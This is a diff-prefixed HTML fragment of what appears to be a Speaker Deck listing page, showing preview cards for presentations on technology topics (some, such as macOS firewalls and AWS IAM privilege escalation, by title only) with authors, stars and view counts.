+              <span title="5,173 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 5.2k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/fire-and-ice-making-and-breaking-macos-firewalls" title="Fire &amp; Ice: Making and Breaking macOS Firewalls">
+      <div class="card deck-preview" data-id="4bb785e4b1734c88b9c08bb761345d79" data-slide-count="43" data-cover-image="https://files.speakerdeck.com/presentations/4bb785e4b1734c88b9c08bb761345d79/preview_slide_0.jpg?10563069">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4bb785e4b1734c88b9c08bb761345d79/preview_slide_0.jpg?10563069');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4bb785e4b1734c88b9c08bb761345d79/preview_slide_0.jpg?10563069');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 4
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="897 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 900</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/patrickwardle/fruitfly-via-a-custom-c-and-c-server-extended-version" title="[T2 2017] Offensive Malware Analysis: Dissecting OSX/FruitFly via a Custom C&amp;C Server (Extended Version!)">
+      <div class="card deck-preview" data-id="d0c1336a935040b6a2761676b22deddb" data-slide-count="55" data-cover-image="https://files.speakerdeck.com/presentations/d0c1336a935040b6a2761676b22deddb/preview_slide_0.jpg?8872611">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/d0c1336a935040b6a2761676b22deddb/preview_slide_0.jpg?8872611');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/d0c1336a935040b6a2761676b22deddb/preview_slide_0.jpg?8872611');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/cc23340e1d811f083fb8d2dd1213c42b?s=48" alt="Cc23340e1d811f083fb8d2dd1213c42b?s=48" />
+              patrickwardle
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 1
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="709 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 710</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+      </div>
+
+      <div class="row mb-4 align-items-center">
+        <div class="col-12 col-lg-9 mb-3 mb-lg-0">
+          <h2 class="m-0">Other Decks in Technology</h2>
+        </div>
+        <div class="col-12 col-lg-3 text-lg-right">
+          <a class="btn btn-outline-primary" href="/c/technology">
+            See All in Technology <svg class="icon icon-chevron-right "><use xlink:href="/icons/icons.svg#icon-chevron-right"></use></svg>
+</a>        </div>
+      </div>
+      <div class="row">
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/soudai/release-safely-2" title="実際にリリースするための手段を知ろう / release-safely-2">
+      <div class="card deck-preview" data-id="da3bdf2ea8e448d186f88bf90e43338b" data-slide-count="78" data-cover-image="https://files.speakerdeck.com/presentations/da3bdf2ea8e448d186f88bf90e43338b/preview_slide_0.jpg?18074468">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/da3bdf2ea8e448d186f88bf90e43338b/preview_slide_0.jpg?18074468');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/da3bdf2ea8e448d186f88bf90e43338b/preview_slide_0.jpg?18074468');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/88f4e84b94fe07cddbd9e6479d689192?s=48" alt="88f4e84b94fe07cddbd9e6479d689192?s=48" />
+              soudai
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 4
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="520 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 520</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/komik699/pmlt2" title="pmlt2">
+      <div class="card deck-preview" data-id="0715e189781c412cba6f08f8e60f8aa2" data-slide-count="8" data-cover-image="https://files.speakerdeck.com/presentations/0715e189781c412cba6f08f8e60f8aa2/preview_slide_0.jpg?18048503">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/0715e189781c412cba6f08f8e60f8aa2/preview_slide_0.jpg?18048503');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/0715e189781c412cba6f08f8e60f8aa2/preview_slide_0.jpg?18048503');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/3d9e7f071ee9e03cbb088e64fae76fec?s=48" alt="3d9e7f071ee9e03cbb088e64fae76fec?s=48" />
+              komik699
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="504 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 500</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/yukihirochiba/iam-access-analyzer-wohuo-yong-sitezui-xiao-quan-xian-womu-zhi-sou" title="IAM Access Analyzer を活用して最小権限を目指そう">
+      <div class="card deck-preview" data-id="8aa678de7077485183e76b7700cb66cd" data-slide-count="70" data-cover-image="https://files.speakerdeck.com/presentations/8aa678de7077485183e76b7700cb66cd/preview_slide_0.jpg?18095133">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/8aa678de7077485183e76b7700cb66cd/preview_slide_0.jpg?18095133');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/8aa678de7077485183e76b7700cb66cd/preview_slide_0.jpg?18095133');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/325ce6fcd0a74ff78990b8632817da55?s=48" alt="325ce6fcd0a74ff78990b8632817da55?s=48" />
+              yukihirochiba
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="213 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 210</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/freedom_tk/arcgis-platform-paas-false-api-woshi-tutemita" title="ArcGIS Platform (PaaS) の API を使ってみた！">
+      <div class="card deck-preview" data-id="ce87fb4d470549d48b77df19a6924ba4" data-slide-count="8" data-cover-image="https://files.speakerdeck.com/presentations/ce87fb4d470549d48b77df19a6924ba4/preview_slide_0.jpg?17970466">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/ce87fb4d470549d48b77df19a6924ba4/preview_slide_0.jpg?17970466');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/ce87fb4d470549d48b77df19a6924ba4/preview_slide_0.jpg?17970466');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/8d5ec86449745c31872afc6efdaf2f0a?s=48" alt="8d5ec86449745c31872afc6efdaf2f0a?s=48" />
+              freedom_tk
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 1
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="232 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 230</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/cafenero_777/research-paper-introduction-number-21-running-bgp-in-data-centers-at-scale" title="Research Paper Introduction #21 Running BGP in Data Centers at Scale">
+      <div class="card deck-preview" data-id="e7f17f795ffb490e967613643ebad596" data-slide-count="17" data-cover-image="https://files.speakerdeck.com/presentations/e7f17f795ffb490e967613643ebad596/preview_slide_0.jpg?18063259">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/e7f17f795ffb490e967613643ebad596/preview_slide_0.jpg?18063259');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/e7f17f795ffb490e967613643ebad596/preview_slide_0.jpg?18063259');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/464d1574ef169d2457c907e77794d973?s=48" alt="464d1574ef169d2457c907e77794d973?s=48" />
+              cafenero_777
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="115 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 120</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/kanaugust/churn-analysis-with-survival-curve" title="Seminar #43 - Cohort Analysis Part 2 - Retention / Churn Analysis with Survival Curve">
+      <div class="card deck-preview" data-id="fccbc78fb7df4475a40eda278d985930" data-slide-count="147" data-cover-image="https://files.speakerdeck.com/presentations/fccbc78fb7df4475a40eda278d985930/preview_slide_0.jpg?18008795">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/fccbc78fb7df4475a40eda278d985930/preview_slide_0.jpg?18008795');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/fccbc78fb7df4475a40eda278d985930/preview_slide_0.jpg?18008795');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/19fc8f6113c5c3d86e6176362ff29479?s=48" alt="19fc8f6113c5c3d86e6176362ff29479?s=48" />
+              kanaugust
+            </div>
+              <div class="pr-2 mr-auto py-3">
+                  <div class="badge badge-pro ">PRO</div>
+
+              </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="168 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 170</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/line_developers/vue-pivot-table-plus" title="vue-pivot-table-plus">
+      <div class="card deck-preview" data-id="02363a5ae9524632876a62c27812a97b" data-slide-count="41" data-cover-image="https://files.speakerdeck.com/presentations/02363a5ae9524632876a62c27812a97b/preview_slide_0.jpg?18046287">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/02363a5ae9524632876a62c27812a97b/preview_slide_0.jpg?18046287');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/02363a5ae9524632876a62c27812a97b/preview_slide_0.jpg?18046287');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/53850955f15249a1a9dc49df6113e400?s=48" alt="53850955f15249a1a9dc49df6113e400?s=48" />
+              line_developers
+            </div>
+              <div class="pr-2 mr-auto py-3">
+                  <div class="badge badge-pro ">PRO</div>
+
+              </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 1
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="455 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 460</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/shiromoto/devopszu-zhi-deqagajia-su-falsetameniqu-rizu-ndemitakoto" title="DevOps組織でQAが加速のために取り組んでみたこと">
+      <div class="card deck-preview" data-id="9c6d4f66c60e49aaae713089bc25d2a5" data-slide-count="49" data-cover-image="https://files.speakerdeck.com/presentations/9c6d4f66c60e49aaae713089bc25d2a5/preview_slide_0.jpg?18113023">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/9c6d4f66c60e49aaae713089bc25d2a5/preview_slide_0.jpg?18113023');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/9c6d4f66c60e49aaae713089bc25d2a5/preview_slide_0.jpg?18113023');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/6a1950c1acc608fdcfd2c1c89e3f4501?s=48" alt="6a1950c1acc608fdcfd2c1c89e3f4501?s=48" />
+              shiromoto
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 1
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="308 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 310</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/ttakaguchi/keisu-special-lecture-20210511" title="keisu_special_lecture_20210511.pdf">
+      <div class="card deck-preview" data-id="73714e3ae6334466b2b9f55234d8c701" data-slide-count="70" data-cover-image="https://files.speakerdeck.com/presentations/73714e3ae6334466b2b9f55234d8c701/preview_slide_0.jpg?18082079">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/73714e3ae6334466b2b9f55234d8c701/preview_slide_0.jpg?18082079');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/73714e3ae6334466b2b9f55234d8c701/preview_slide_0.jpg?18082079');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/05f8401462c2d4694f006634e970d577?s=48" alt="05f8401462c2d4694f006634e970d577?s=48" />
+              ttakaguchi
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="189 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 190</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/kloudleinc/iam-bad-privilege-escalation-using-misconfigured-policies-in-aws-iam-webinar" title="IAM Bad: Privilege Escalation using Misconfigured Policies in AWS IAM (Webinar)">
+      <div class="card deck-preview" data-id="765385acf44b4ce585a241b513a0abf0" data-slide-count="26" data-cover-image="https://files.speakerdeck.com/presentations/765385acf44b4ce585a241b513a0abf0/preview_slide_0.jpg?18013630">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/765385acf44b4ce585a241b513a0abf0/preview_slide_0.jpg?18013630');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/765385acf44b4ce585a241b513a0abf0/preview_slide_0.jpg?18013630');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/9b2600a82821673d9d0f03cc6f7bc56e?s=48" alt="9b2600a82821673d9d0f03cc6f7bc56e?s=48" />
+              kloudleinc
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="331 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 330</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/audreyt/20210518jian-xun-shi-lian-zhi-jian-bao-chun-tu-qia" title="20210518簡訊實聯制簡報（純圖卡）">
+      <div class="card deck-preview" data-id="863102f362394019afcdc86f81fceed4" data-slide-count="10" data-cover-image="https://files.speakerdeck.com/presentations/863102f362394019afcdc86f81fceed4/preview_slide_0.jpg?18091875">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/863102f362394019afcdc86f81fceed4/preview_slide_0.jpg?18091875');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/863102f362394019afcdc86f81fceed4/preview_slide_0.jpg?18091875');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/f63068d724b6084f4807a86426b3b9eb?s=48" alt="F63068d724b6084f4807a86426b3b9eb?s=48" />
+              audreyt
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="266,586 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 270k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/takasumasakazu/shan-chuan-ji-qi-ren-3irobotix-dot-com-20210507-lidarzhi-pin" title="杉川機器人 3iRobotix.com 20210507 LiDAR製品">
+      <div class="card deck-preview" data-id="eddca5891e914ebaa35888969814b7aa" data-slide-count="6" data-cover-image="https://files.speakerdeck.com/presentations/eddca5891e914ebaa35888969814b7aa/preview_slide_0.jpg?18019608">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/eddca5891e914ebaa35888969814b7aa/preview_slide_0.jpg?18019608');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/eddca5891e914ebaa35888969814b7aa/preview_slide_0.jpg?18019608');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/9db5ad8f2c24b5cfaa9c9e09ca275af6?s=48" alt="9db5ad8f2c24b5cfaa9c9e09ca275af6?s=48" />
+              takasumasakazu
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="1,334 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 1.3k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+      </div>
+
+      <div class="row mb-4 align-items-center">
+        <div class="col-12 col-lg-9 mb-3 mb-lg-0">
+          <h2 class="m-0">Featured</h2>
+        </div>
+        <div class="col-12 col-lg-3 text-lg-right">
+          <a class="btn btn-outline-primary" href="/p/featured">
+            See All Featured <svg class="icon icon-chevron-right "><use xlink:href="/icons/icons.svg#icon-chevron-right"></use></svg>
+</a>        </div>
+      </div>
+      <div class="row">
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/hursman/pencils-down-stop-designing-start-developing" title="Pencils Down: Stop Designing &amp; Start Developing">
+      <div class="card deck-preview" data-id="4fce2edde27546001f017f34" data-slide-count="51" data-cover-image="https://files.speakerdeck.com/presentations/4fce2edde27546001f017f34/preview_slide_0.jpg?411842">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4fce2edde27546001f017f34/preview_slide_0.jpg?411842');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4fce2edde27546001f017f34/preview_slide_0.jpg?411842');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/79acae287842acf29084005533a7fb3b?s=48" alt="79acae287842acf29084005533a7fb3b?s=48" />
+              hursman
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 108
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="9,327 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 9.3k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/edds/what-the-flash-photography-introduction" title="What the flash - Photography Introduction">
+      <div class="card deck-preview" data-id="4fd1c5665d50290183010ab1" data-slide-count="17" data-cover-image="https://files.speakerdeck.com/presentations/4fd1c5665d50290183010ab1/preview_slide_0.jpg?417888">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4fd1c5665d50290183010ab1/preview_slide_0.jpg?417888');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4fd1c5665d50290183010ab1/preview_slide_0.jpg?417888');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/5ce91fa49a613cbc3e20d5f96856473f?s=48" alt="5ce91fa49a613cbc3e20d5f96856473f?s=48" />
+              edds
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 56
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="9,434 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 9.4k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/schacon/robots-beer-and-maslow" title="Robots, Beer and Maslow">
+      <div class="card deck-preview" data-id="4e97091674dea20054000f5b" data-slide-count="144" data-cover-image="https://files.speakerdeck.com/presentations/4e97091674dea20054000f5b/preview_slide_0.jpg?586356">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4e97091674dea20054000f5b/preview_slide_0.jpg?586356');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4e97091674dea20054000f5b/preview_slide_0.jpg?586356');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/9375a9529679f1b42b567a640d775e7d?s=48" alt="9375a9529679f1b42b567a640d775e7d?s=48" />
+              schacon
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 147
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="6,718 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 6.7k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/holman/how-github-uses-github-to-build-github" title="How GitHub Uses GitHub to Build GitHub">
+      <div class="card deck-preview" data-id="4e79b461c9bdcb003f00331d" data-slide-count="112" data-cover-image="https://files.speakerdeck.com/presentations/4e79b461c9bdcb003f00331d/preview_slide_0.jpg?533532">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4e79b461c9bdcb003f00331d/preview_slide_0.jpg?533532');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4e79b461c9bdcb003f00331d/preview_slide_0.jpg?533532');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/78b475797a14c84799063c7cd073962f?s=48" alt="78b475797a14c84799063c7cd073962f?s=48" />
+              holman
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 462
+            </div>
+            <div class="px-2 ml-auto py-3">
